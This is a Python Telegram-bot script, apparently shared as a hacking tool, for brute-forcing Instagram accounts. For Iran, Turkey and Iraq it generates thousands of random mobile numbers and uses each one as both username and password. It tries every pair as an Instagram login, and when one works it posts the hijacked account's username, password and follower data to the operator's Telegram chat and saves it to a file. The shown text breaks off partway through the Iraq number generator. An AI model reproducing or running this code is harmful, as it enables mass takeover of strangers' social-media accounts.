""" 
-------------------------------------------------------------------------
- Cod BY : SidraELEzz
- Github : https://github.com/SidraELEzz
- Telegram: https://t.me/SidraTools
- Telegram: https://t.me/tt_rq
-------------------------------------------------------------------------
     
""" 
try:
	import  sys, os, random, time,requests,time,telebot,InstagramIG
	from time import sleep
	from telebot import types as SidraTools
	from InstagramIG import SidraELEzz as long
except ImportError as e:
	os.system('pip install requests')
	os.system('pip install InstagramIG')
	os.system('pip install PyTelegramBotAPI==3.6.7')
	
#----------------------------------------------------[colors]----------------------------------------------------#
A = "\033[1;91m"
B = "\033[1;90m"
C = "\033[1;97m"
E = "\033[1;92m"
H = "\033[1;93m"
K = "\033[1;94m"
L = "\033[1;95m"
M = "\033[1;96m"
Q = "("
W = ")"
s=requests.Session()
#----------------------------------------------------[Banner]----------------------------------------------------#
Sidra= f""" 
   {B}███████{M}╗{B}██{M}╗{B}██████{M}╗ {B}██████{M}╗  {B}█████{M}╗ 
   {B}██{M}╔════╝{B}██{M}║{B}██{M}╔══{B}██{M}╗{B}██{M}╔══{B}██{M}╗{B}██{M}╔══{B}██{M}╗
   {B}███████{M}╗{B}██{M}║{B}██{M}║  {B}██{M}║{B}██████{M}╔╝{B}███████{M}║
   {M}╚════{B}██{M}║{B}██{M}║{B}██{M}║  {B}██{M}║{B}██{M}╔══{B}██{M}╗{B}██{M}╔══{B}██{M}║
   {B}███████{M}║{B}██{M}║{B}██████{M}╔╝{B}██{M}║  {B}██{M}║{B}██{M}║  {B}██{M}║
   {M}╚══════╝╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   
                                       
\033[1;93m < \033[1;92mTHE BOT CHECKER ACCOUNT INSTAGRAM\033[1;93m >  \033[1;91m 
 ---------------------------
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mAUTHOR     : SIDRA ELEZZ
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mTelegram   : SIDRATOOLS
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mYOUTUBE    : TERMUX TOOLS
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mGITHUB     : GITHUB.COM/SIDRAELEZZ
""" 
Start= f""" 

     {B}██{M}╗{B}███{M}╗   {B}██{M}╗{B}███████{M}╗{B}████████{M}╗ {B}█████{M}╗ 
     {B}██{M}║{B}████{M}╗  {B}██{M}║{B}██{M}╔════╝╚══{B}██{M}╔══╝{B}██{M}╔══{B}██{M}╗
     {B}██{M}║{B}██{M}╔{B}██{M}╗ {B}██{M}║{B}███████{M}╗   {B}██{M}║   {B}███████{M}║
     {B}██{M}║{B}██{M}║╚{B}██{M}╗{B}██{M}║╚════{B}██{M}║   {B}██{M}║   {B}██{M}╔══{B}██{M}║
     {B}██{M}║{B}██{M}║ ╚{B}████{M}║{B}███████{M}║   {B}██{M}║   {B}██{M}║  {B}██{M}║
     {M}╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝{A}• {E}V-3
                         
\033[1;93m < \033[1;92mTHE BOT CHECKER ACCOUNT INSTAGRAM\033[1;93m >  \033[1;91m 
 ---------------------------
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mAUTHOR     : SIDRA ELEZZ
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mTelegram   : SIDRATOOLS
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mYOUTUBE    : TERMUX TOOLS
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mGITHUB     : GITHUB.COM/SIDRAELEZZ
""" 
os.system('clear')

""" 
-------------------------------------------------------------------------
- Cod BY : SidraELEzz
- Github : https://github.com/SidraELEzz
- Telegram: https://t.me/SidraTools
- Telegram: https://t.me/tt_rq
-------------------------------------------------------------------------
     
""" 

#----------------------------------------------------[Sidra_Cod_Checker]----------------------------------------------------#  
os.system('clear')
os.system('rm -rf .txt')
print(Start)
API_TOKEN = input(A+"("+E+"⌯"+A+")"+H+ " Enter Token :\n"+C)
ID = input(A+"("+E+"⌯"+A+")"+H+ " ID Yours :\n"+C)
Sidraaok = ("⌯ Welcome to the Instagram Random Account Checker Bot •\n\n⌯ Tele : @SidraTools\n. — — — — —  — — — — — . \n⌯To Start The scan Press /start\n")
os.system('clear')
print(Start)
Top("\033[1;92m • To Start The Scan Press /start On The Bot  Ok ✓  ")
requests.get("https://api.telegram.org/bot"+str(API_TOKEN)+"/sendMessage?chat_id="+str(ID)+"&text="+str(Sidraaok))
bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(content_types=["text"])
def any_msg(message):
    Sid  = SidraTools.InlineKeyboardMarkup(row_width=2)
    Ua1 = SidraTools.InlineKeyboardButton(text = "‹ (1) ᴄʜᴇᴄᴋᴇʀ", callback_data="One")
    Ua2 = SidraTools.InlineKeyboardButton(text = "‹ (2) ᴄʜᴇᴄᴋᴇʀ", callback_data="Oen")
    Ua3 = SidraTools.InlineKeyboardButton('المطور', url='https://t.me/SidraTools')
    Sid.add(Ua1, Ua2,Ua3)
    bot.send_message(message.chat.id, "⌯ ᴡᴇʟᴄᴏᴍᴇ ѕɪᴅʀᴀᴇʟᴇᴢᴢ  👩‍💻 ⁦⌯", reply_markup=Sid)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline(call):
    ok=0
    cp=0
    erorr=0
    if call.data == "SidraTools":
        Sid  = SidraTools.InlineKeyboardMarkup(row_width=2)
        Ua1 = SidraTools.InlineKeyboardButton(text = "‹ (1) ᴄʜᴇᴄᴋᴇʀ", callback_data="One")
        Ua2 = SidraTools.InlineKeyboardButton(text = "‹ (2) ᴄʜᴇᴄᴋᴇʀ", callback_data="Oen")
        Ua3 = SidraTools.InlineKeyboardButton('المطور', url='https://t.me/SidraTools')
        Sid.add(Ua1, Ua2,Ua3)
        bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id, text="⌯ ᴡᴇʟᴄᴏᴍᴇ ѕɪᴅʀᴀᴇʟᴇᴢᴢ  👩‍💻 ⁦⌯",reply_markup=Sid)
 
    if call.data == "One":
        Sid  = SidraTools.InlineKeyboardMarkup(row_width=2)
        Ka1 = SidraTools.InlineKeyboardButton("‹ (1) ᴄʜᴇᴄᴋᴇʀ-ɪʀᴀɴ", callback_data="1")
        Ka2 = SidraTools.InlineKeyboardButton("‹ (2) ᴄʜᴇᴄᴋᴇʀ-ᴛᴜʀᴋ", callback_data="2")
        Ka3 = SidraTools.InlineKeyboardButton("‹ (⌯) ʙᴀᴄᴋ", callback_data="SidraTools")
        Sid.add(Ka1, Ka2, Ka3)
        bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id, text="⌯ ᴡᴇʟᴄᴏᴍᴇ ѕɪᴅʀᴀᴇʟᴇᴢᴢ  👩‍💻 ⁦⌯",reply_markup=Sid)

    elif call.data == "Oen":
        Sid  = SidraTools.InlineKeyboardMarkup(row_width=2)
        Ka1 = SidraTools.InlineKeyboardButton("‹ (1) ᴄʜᴇᴄᴋᴇʀ-ɪʀᴀǫ", callback_data="3")
        Ka2 = SidraTools.InlineKeyboardButton("‹ (2) ᴄʜᴇᴄᴋᴇʀ-ᴇɢʏᴘ", callback_data="4")
        Ka3 = SidraTools.InlineKeyboardButton("‹ (⌯) ʙᴀᴄᴋ", callback_data="SidraTools")
        Sid.add(Ka1, Ka2, Ka3)
        bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id, text="⌯ ᴡᴇʟᴄᴏᴍᴇ ѕɪᴅʀᴀᴇʟᴇᴢᴢ  👩‍💻 ⁦⌯",reply_markup=Sid)
        
    elif call.data == "1":
        bot.answer_callback_query(callback_query_id=call.id, show_alert=True, text="‹ ⌯ ᴛᴏ ѕᴛᴀʀᴛ ᴛʜᴇ ѕᴄᴀɴ ᴘʀᴇѕѕ ᴛʜᴇ ‹ ⌯ ѕᴛᴀʀᴛ-ᴄʜᴇᴄᴋᴇʀ ")
        Sid   = SidraTools.InlineKeyboardMarkup(row_width=1)
        Ma1 = SidraTools.InlineKeyboardButton("‹ ⌯ ѕᴛᴀʀᴛ-ᴄʜᴇᴄᴋᴇʀ", callback_data="Iran")
        Ma2 = SidraTools.InlineKeyboardButton("‹ ⌯ ᴇхɪᴛ", callback_data="0")
        Ma3 = SidraTools.InlineKeyboardButton("‹ ⌯ ʙᴀᴄᴋ", callback_data="SidraTools")
        Sid.add(Ma1,Ma2,Ma3)
        bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id, text="‹ ⌯ ᴛᴏ ѕᴛᴀʀᴛ ᴛʜᴇ ѕᴄᴀɴ ᴘʀᴇѕѕ ᴛʜᴇ \n‹ ⌯ ѕᴛᴀʀᴛ-ᴄʜᴇᴄᴋᴇʀ",reply_markup=Sid)
        
    
    elif call.data == "2":
        bot.answer_callback_query(callback_query_id=call.id, show_alert=True, text="‹ ⌯ ᴛᴏ ѕᴛᴀʀᴛ ᴛʜᴇ ѕᴄᴀɴ ᴘʀᴇѕѕ ᴛʜᴇ ‹ ⌯ ѕᴛᴀʀᴛ-ᴄʜᴇᴄᴋᴇʀ ")
        Sid   = SidraTools.InlineKeyboardMarkup(row_width=1)
        Ma1 = SidraTools.InlineKeyboardButton("‹ ⌯ ѕᴛᴀʀᴛ-ᴄʜᴇᴄᴋᴇʀ", callback_data="Turkey")
        Ma2 = SidraTools.InlineKeyboardButton("‹ ⌯ ᴇхɪᴛ", callback_data="0")
        Ma3 = SidraTools.InlineKeyboardButton("‹ ⌯ ʙᴀᴄᴋ", callback_data="SidraTools")
        Sid.add(Ma1,Ma2,Ma3)
        bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id, text="‹ ⌯ ᴛᴏ ѕᴛᴀʀᴛ ᴛʜᴇ ѕᴄᴀɴ ᴘʀᴇѕѕ ᴛʜᴇ \n‹ ⌯ ѕᴛᴀʀᴛ-ᴄʜᴇᴄᴋᴇʀ",reply_markup=Sid)
        
    elif call.data == "3":
        bot.answer_callback_query(callback_query_id=call.id, show_alert=True, text="‹ ⌯ ᴛᴏ ѕᴛᴀʀᴛ ᴛʜᴇ ѕᴄᴀɴ ᴘʀᴇѕѕ ᴛʜᴇ ‹ ⌯ ѕᴛᴀʀᴛ-ᴄʜᴇᴄᴋᴇʀ ")
        Sid   = SidraTools.InlineKeyboardMarkup(row_width=1)
        Ma1 = SidraTools.InlineKeyboardButton("‹ ⌯ ѕᴛᴀʀᴛ-ᴄʜᴇᴄᴋᴇʀ", callback_data="Iraq")
        Ma2 = SidraTools.InlineKeyboardButton("‹ ⌯ ᴇхɪᴛ", callback_data="0")
        Ma3 = SidraTools.InlineKeyboardButton("‹ ⌯ ʙᴀᴄᴋ", callback_data="SidraTools")
        Sid.add(Ma1,Ma2,Ma3)
        bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id, text="‹ ⌯ ᴛᴏ ѕᴛᴀʀᴛ ᴛʜᴇ ѕᴄᴀɴ ᴘʀᴇѕѕ ᴛʜᴇ \n‹ ⌯ ѕᴛᴀʀᴛ-ᴄʜᴇᴄᴋᴇʀ",reply_markup=Sid)
        
    elif call.data == "4":
        bot.answer_callback_query(callback_query_id=call.id, show_alert=True, text="‹ ⌯ ᴛᴏ ѕᴛᴀʀᴛ ᴛʜᴇ ѕᴄᴀɴ ᴘʀᴇѕѕ ᴛʜᴇ ‹ ⌯ ѕᴛᴀʀᴛ-ᴄʜᴇᴄᴋᴇʀ ")
        Sid   = SidraTools.InlineKeyboardMarkup(row_width=1)
        Ma1 = SidraTools.InlineKeyboardButton("‹ ⌯ ѕᴛᴀʀᴛ-ᴄʜᴇᴄᴋᴇʀ", callback_data="Egypt")
        Ma2 = SidraTools.InlineKeyboardButton("‹ ⌯ ᴇхɪᴛ", callback_data="0")
        Ma3 = SidraTools.InlineKeyboardButton("‹ ⌯ ʙᴀᴄᴋ", callback_data="SidraTools")
        Sid.add(Ma1,Ma2,Ma3)
        bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id, text="‹ ⌯ ᴛᴏ ѕᴛᴀʀᴛ ᴛʜᴇ ѕᴄᴀɴ ᴘʀᴇѕѕ ᴛʜᴇ \n‹ ⌯ ѕᴛᴀʀᴛ-ᴄʜᴇᴄᴋᴇʀ",reply_markup=Sid)
        
        
    elif call.data == "Iran": #iran
        bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text='‹ ᴘʟᴇᴀѕᴇ ᴡᴀɪᴛ ᴀ ᴍɪɴᴜᴛᴇ....')
        os.system('rm -rf .txt')
        def Combo():
        	
            for lik in range(2500):
                x1= random.randint(1000000, 9999999)
                z1= ("+98912"+str(x1)+":0912"+str(x1))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(z1)+"\n")
                x2 = random.randint(1000000, 9999999)
                z2 = ("+98913"+str(x2)+":0913"+str(x2))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(z2)+"\n")
                x3 = random.randint(1000000, 9999999)
                z3 = ("+98910"+str(x3)+":0910"+str(x3))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(z3)+"\n")
                x4 = random.randint(1000000, 9999999)
                z5 = ("+98914"+str(x4)+":0914"+str(x4))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(z5)+"\n")
                x6 = random.randint(1000000, 9999999)
                z6 = ("+98915"+str(x6)+":0915"+str(x6))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(z6)+"\n")
                x7 = random.randint(1000000, 9999999)
                z7 = ("+98916"+str(x7)+":0916"+str(x7))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(z7)+"\n")
                x8 = random.randint(1000000, 9999999)
                z8 = ("+98917"+str(x8)+":0917"+str(x8))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(z8)+"\n")
                S1 = random.randint(1000000, 9999999)
                R1 = ("+98918"+str(S1)+":0918"+str(S1))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(R1)+"\n")
                S2 = random.randint(1000000, 9999999)
                R2 = ("+98919"+str(S2)+":0919"+str(S2))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(R2)+"\n")
                S3 = random.randint(1000000, 9999999)
                R3 = ("+98901"+str(S3)+":0901"+str(S3))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(R3)+"\n")
                S4 = random.randint(1000000, 9999999)
                R4 = ("+98902"+str(S4)+":0902"+str(S4))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(R4)+"\n")
                Y1= random.randint(1000000, 9999999)
                H1= ("+98903"+str(Y1)+":0903"+str(Y1))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(H1)+"\n")
                Y2 = random.randint(1000000, 9999999)
                H2 = ("+98904"+str(Y2)+":0904"+str(Y2))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(H2)+"\n")
                Y3 = random.randint(1000000, 9999999)
                H3 = ("+98905"+str(Y3)+":0905"+str(Y3))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(H3)+"\n")
                Y4 = random.randint(1000000, 9999999)
                H5 = ("+98912"+str(Y4)+":0912"+str(Y4))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(H5)+"\n")
                Y6 = random.randint(1000000, 9999999)
                H6 = ("+98930"+str(Y6)+":0930"+str(Y6))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(H6)+"\n")
                Y7 = random.randint(1000000, 9999999)
                H7 = ("+98931"+str(Y7)+":0931"+str(Y7))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(H7)+"\n")
                Y8 = random.randint(1000000, 9999999)
                H8 = ("+98932"+str(Y8)+":0932"+str(Y8))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(H8)+"\n")
                U1 = random.randint(1000000, 9999999)
                M1 = ("+98933"+str(U1)+":0933"+str(U1))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(M1)+"\n")
                U2 = random.randint(1000000, 9999999)
                M2 = ("+98934"+str(U2)+":0934"+str(U2))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(M2)+"\n")
                U3 = random.randint(1000000, 9999999)
                M3 = ("+98935"+str(U3)+":0935"+str(U3))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(R3)+"\n")
                U4 = random.randint(1000000, 9999999)
                M4 = ("+98936"+str(U4)+":0936"+str(U4))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(M4)+"\n")
                B1= random.randint(1000000, 9999999)
                L1= ("+98937"+str(B1)+":0937"+str(B1))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(L1)+"\n")
                B2 = random.randint(1000000, 9999999)
                L2 = ("+98938"+str(B2)+":0938"+str(B2))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(L2)+"\n")
                B3 = random.randint(1000000, 9999999)
                L3 = ("+98939"+str(B3)+":0939"+str(B3))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(L3)+"\n")
                B4 = random.randint(1000000, 9999999)
                L5 = ("+98920"+str(B4)+":0920"+str(B4))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(L5)+"\n")
                B6 = random.randint(1000000, 9999999)
                L6 = ("+98921"+str(B6)+":0921"+str(B6))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(L6)+"\n")
                B7 = random.randint(1000000, 9999999)
                L7 = ("+98922"+str(B7)+":0922"+str(B7))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(L7)+"\n")
                
                
        	
            #print
            
        Combo()
		
			
					
		
        ELEzz = open('.txt', 'r')
        while True:
            APK = ELEzz.readline().split('\n')[0]
            if APK == '':
                bot.send_message(call.message.chat.id, "Examination is over ✓")
                break
            username = APK.split(':')[0]
            password = APK.split(':')[1]
            
            response = long.Instalogin(str(username),str(password)) 
            if (response) ==True:
                ok+=1
                sessionid = open("sessionid.txt", "r").readline().split('\n')[0]
                user = long.username(str(sessionid))
                followers = long.followers(str(user))
                following = long.following(str(user))
                post = long.posts(str(user))
                data = long.data(str(user))
                bot.send_message(call.message.chat.id,"‹ ɪɴѕᴛᴀɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ ✓\n────── • ✧✧ • ──────\n‹ ᴜѕᴇʀɴᴀᴍᴇ : "+str(user)+"\n‹ ᴘᴀѕѕᴡᴏʀᴅ : "+str(password)+"\n‹ ғᴏʟʟᴏᴡᴇʀѕ : "+str(followers)+"\n‹ ғᴏʟʟᴏᴡɪɴɢ : "+str(following)+"\n‹ ᴘᴏѕᴛ : "+str(post)+"\n‹ ᴅᴀᴛᴀ  : "+str(data)+"\n────── • ✧✧ • ──────\n• @SidraTools")
                f=open('Ok.txt','a')
                f.write(username+":"+password+"\n")
                f.close()
            elif (response) ==False:
                cp+=1
                bot.send_message(call.message.chat.id,"‹ ɪɴѕᴛᴀɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ ×\n────── • ✧✧ • ──────\n‹ ᴜѕᴇʀɴᴀᴍᴇ : "+str(username)+"\n‹ ᴘᴀѕѕᴡᴏʀᴅ : "+str(password)+"\n────── • ✧✧ • ──────\n• @SidraTools")
            #print
            
            elif (response) ==None:
                erorr+=1
                Mas = SidraTools.InlineKeyboardMarkup(row_width=1)
                
                Ms2 = SidraTools.InlineKeyboardButton("‹ ɢᴏᴏᴅ : "+str(ok), callback_data="ER1")
                Ms3 = SidraTools.InlineKeyboardButton("‹ ʙᴀɴᴅ : "+str(cp), callback_data="ER2")
                Ms4 = SidraTools.InlineKeyboardButton("‹ ᴛᴇѕᴛ : "+str(erorr), callback_data="ER3")
                Ms5 = SidraTools.InlineKeyboardButton("‹ ʙᴀᴄᴋ", callback_data="SidraTools")
                Ms6 = SidraTools.InlineKeyboardButton('المطور', url='https://t.me/SidraTools')
                Mas.add(Ms2,Ms3,Ms4,Ms5,Ms6)
                bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text="‹ ⌯ ѕᴛᴀʀᴛ-ᴄʜᴇᴄᴋᴇʀ\n‹ ⌯ ᴄᴏᴜɴᴛʀʏ : ɪʀᴀɴ 🇮🇷 ",reply_markup=Mas)
                
			
    elif call.data == "Turkey": #truk
        bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text='‹ ᴘʟᴇᴀѕᴇ ᴡᴀɪᴛ ᴀ ᴍɪɴᴜᴛᴇ....')
        os.system('rm -rf .txt')
        def Combo():
        	
            for lik in range(2500):
                x1= random.randint(1000000, 9999999)
                z1= ("+90501"+str(x1)+":0501"+str(x1))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(z1)+"\n")
                x2 = random.randint(1000000, 9999999)
                z2 = ("+90505"+str(x2)+":0505"+str(x2))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(z2)+"\n")
                x3 = random.randint(1000000, 9999999)
                z3 = ("+90506"+str(x3)+":0506"+str(x3))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(z3)+"\n")
                x4 = random.randint(1000000, 9999999)
                z5 = ("+90507"+str(x4)+":0507"+str(x4))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(z5)+"\n")
                x6 = random.randint(1000000, 9999999)
                z6 = ("+90530"+str(x6)+":0530"+str(x6))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(z6)+"\n")
                x7 = random.randint(1000000, 9999999)
                z7 = ("+90531"+str(x7)+":0530"+str(x7))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(z7)+"\n")
                x8 = random.randint(1000000, 9999999)
                z8 = ("+90532"+str(x8)+":0532"+str(x8))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(z8)+"\n")
                S1 = random.randint(1000000, 9999999)
                R1 = ("+90533"+str(S1)+":0533"+str(S1))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(R1)+"\n")
                S2 = random.randint(1000000, 9999999)
                R2 = ("+90534"+str(S2)+":0534"+str(S2))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(R2)+"\n")
                S3 = random.randint(1000000, 9999999)
                R3 = ("+90535"+str(S3)+":0535"+str(S3))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(R3)+"\n")
                S4 = random.randint(1000000, 9999999)
                R4 = ("+90536"+str(S4)+":0536"+str(S4))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(R4)+"\n")
                Y1= random.randint(1000000, 9999999)
                H1= ("+90537"+str(Y1)+":0537"+str(Y1))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(H1)+"\n")
                Y2 = random.randint(1000000, 9999999)
                H2 = ("+90538"+str(Y2)+":0538"+str(Y2))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(H2)+"\n")
                Y3 = random.randint(1000000, 9999999)
                H3 = ("+90539"+str(Y3)+":0539"+str(Y3))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(H3)+"\n")
                Y4 = random.randint(1000000, 9999999)
                H5 = ("+90540"+str(Y4)+":0540"+str(Y4))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(H5)+"\n")
                Y6 = random.randint(1000000, 9999999)
                H6 = ("+90541"+str(Y6)+":0541"+str(Y6))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(H6)+"\n")
                Y7 = random.randint(1000000, 9999999)
                H7 = ("+90542"+str(Y7)+":0542"+str(Y7))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(H7)+"\n")
                Y8 = random.randint(1000000, 9999999)
                H8 = ("+90543"+str(Y8)+":0543"+str(Y8))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(H8)+"\n")
                U1 = random.randint(1000000, 9999999)
                M1 = ("+90544"+str(U1)+":0544"+str(U1))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(M1)+"\n")
                U2 = random.randint(1000000, 9999999)
                M2 = ("+90545"+str(U2)+":0545"+str(U2))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(M2)+"\n")
                U3 = random.randint(1000000, 9999999)
                M3 = ("+90546"+str(U3)+":0546"+str(U3))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(R3)+"\n")
                U4 = random.randint(1000000, 9999999)
                M4 = ("+90547"+str(U4)+":0547"+str(U4))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(M4)+"\n")
                B1= random.randint(1000000, 9999999)
                L1= ("+90548"+str(B1)+":0548"+str(B1))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(L1)+"\n")
                B2 = random.randint(1000000, 9999999)
                L2 = ("+90549"+str(B2)+":0549"+str(B2))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(L2)+"\n")
                B3 = random.randint(1000000, 9999999)
                L3 = ("+90551"+str(B3)+":0551"+str(B3))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(L3)+"\n")
                B4 = random.randint(1000000, 9999999)
                L5 = ("+90552"+str(B4)+":0552"+str(B4))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(L5)+"\n")
                B6 = random.randint(1000000, 9999999)
                L6 = ("+90553"+str(B6)+":0553"+str(B6))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(L6)+"\n")
                B7 = random.randint(1000000, 9999999)
                L7 = ("+90554"+str(B7)+":0554"+str(B7))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(L7)+"\n")
                
                
        	
            #print
            
        Combo()
		
			
					
		
        ELEzz = open('.txt', 'r')
        while True:
            APK = ELEzz.readline().split('\n')[0]
            if APK == '':
                bot.send_message(call.message.chat.id, "Examination is over ✓")
                break
            username = APK.split(':')[0]
            password = APK.split(':')[1]
            
            response = long.Instalogin(str(username),str(password)) 
            if (response) ==True:
                ok+=1
                sessionid = open("sessionid.txt", "r").readline().split('\n')[0]
                user = long.username(str(sessionid))
                followers = long.followers(str(user))
                following = long.following(str(user))
                post = long.posts(str(user))
                data = long.data(str(user))
                bot.send_message(call.message.chat.id,"‹ ɪɴѕᴛᴀɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ ✓\n────── • ✧✧ • ──────\n‹ ᴜѕᴇʀɴᴀᴍᴇ : "+str(user)+"\n‹ ᴘᴀѕѕᴡᴏʀᴅ : "+str(password)+"\n‹ ғᴏʟʟᴏᴡᴇʀѕ : "+str(followers)+"\n‹ ғᴏʟʟᴏᴡɪɴɢ : "+str(following)+"\n‹ ᴘᴏѕᴛ : "+str(post)+"\n‹ ᴅᴀᴛᴀ  : "+str(data)+"\n────── • ✧✧ • ──────\n• @SidraTools")
                f=open('Ok.txt','a')
                f.write(username+":"+password+"\n")
                f.close()
            elif (response) ==False:
                cp+=1
                bot.send_message(call.message.chat.id,"‹ ɪɴѕᴛᴀɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ ×\n────── • ✧✧ • ──────\n‹ ᴜѕᴇʀɴᴀᴍᴇ : "+str(username)+"\n‹ ᴘᴀѕѕᴡᴏʀᴅ : "+str(password)+"\n────── • ✧✧ • ──────\n• @SidraTools")
            #print
            
            elif (response) ==None:
                erorr+=1
                Mas = SidraTools.InlineKeyboardMarkup(row_width=1)
                
                Ms2 = SidraTools.InlineKeyboardButton("‹ ɢᴏᴏᴅ : "+str(ok), callback_data="ER1")
                Ms3 = SidraTools.InlineKeyboardButton("‹ ʙᴀɴᴅ : "+str(cp), callback_data="ER2")
                Ms4 = SidraTools.InlineKeyboardButton("‹ ᴛᴇѕᴛ : "+str(erorr), callback_data="ER3")
                Ms5 = SidraTools.InlineKeyboardButton("‹ ʙᴀᴄᴋ", callback_data="SidraTools")
                Ms6 = SidraTools.InlineKeyboardButton('المطور', url='https://t.me/SidraTools')
                Mas.add(Ms2,Ms3,Ms4,Ms5,Ms6)
                bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text="‹ ⌯ ѕᴛᴀʀᴛ-ᴄʜᴇᴄᴋᴇʀ\n‹ ⌯ ᴄᴏᴜɴᴛʀʏ : ᴛᴜʀᴋᴇʏ 🇹🇷 ",reply_markup=Mas)
                
                
    elif call.data == "Iraq": #iraq
        bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text='‹ ᴘʟᴇᴀѕᴇ ᴡᴀɪᴛ ᴀ ᴍɪɴᴜᴛᴇ....')
        os.system('rm -rf .txt')
        def Combo():
        	
            for lik in range(2500):
                x1= random.randint(1000000, 9999999)
                z1= ("+964740"+str(x1)+":0740"+str(x1))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(z1)+"\n")
                x2 = random.randint(1000000, 9999999)
                z2 = ("+964743"+str(x2)+":0743"+str(x2))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(z2)+"\n")
                x3 = random.randint(1000000, 9999999)
                z3 = ("+964748"+str(x3)+":0748"+str(x3))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(z3)+"\n")
                x4 = random.randint(1000000, 9999999)
                z5 = ("+964744"+str(x4)+":0744"+str(x4))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(z5)+"\n")
                x6 = random.randint(1000000, 9999999)
                z6 = ("+964749"+str(x6)+":0749"+str(x6))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(z6)+"\n")
                x7 = random.randint(10000000, 99999999)
                z7 = ("+96479"+str(x7)+":079"+str(x7))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(z7)+"\n")
                x8 = random.randint(10000000, 99999999)
                z8 = ("+96478"+str(x8)+":078"+str(x8))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(z8)+"\n")
                S1 = random.randint(10000000, 99999999)
                R1 = ("+96477"+str(S1)+":077"+str(S1))
                with open(".txt", "a") as Sidr:
                    Sidr.write(str(R1)+"\n")
                S2 = random.randint(10000000, 99999999)
